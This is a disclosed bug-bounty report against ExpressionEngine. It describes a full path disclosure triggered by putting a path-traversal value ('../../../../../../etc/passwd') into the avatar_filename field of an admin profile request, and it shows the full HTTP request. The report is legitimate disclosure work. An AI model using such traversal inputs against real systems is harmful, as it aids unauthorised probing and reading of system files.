# Full path + some back-end code disclosure

## Report Details
- **Report ID**: 149212
- **URL**: https://hackerone.com/reports/149212
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-04T17:19:02.228Z
- **Disclosed**: 2016-08-07T15:24:33.615Z

## Reporter
- **Username**: strukt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: expressionengine

## Vulnerability Information
Hello,

Ironically enough, I just discovered a full path disclosure issue. When an admin edits their personal information, a request like the following gets sent:

```
POST /ee/admin.php?/cp/members/profile/settings&id=1 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------14340353543714380361467519033
Content-Length: 1708

-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="csrf_token"

{TOKEN}
-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="url"


-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="location"


-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="bday_d"


-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="bday_m"


-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="bday_y"


-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="bio"


-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="language"

english
-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="preferences[]"

display_avatars
-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="avatar_filename"

ee_paint.jpg
-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="upload_avatar"; filename=""
Content-Type: application/octet-stream


-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="avatar_picker"

choose
-----------------------------14340353543714380361467519033
Content-Disposition: form-data; name="link_avatar"

http://
-----------------------------14340353543714380361467519033--
```

The problem originates from the fact that, when the user attempts to change the value of the parameter "avatar_filename" to something like `../../../../../../etc/passwd`, as an attempt to include such file, an exception gets thrown, disclosing the full path and some code from the back end.

Note: I didn't check if this is the case for normal uses or not, yet, working on it.

Regards

## Attachments
No attachments
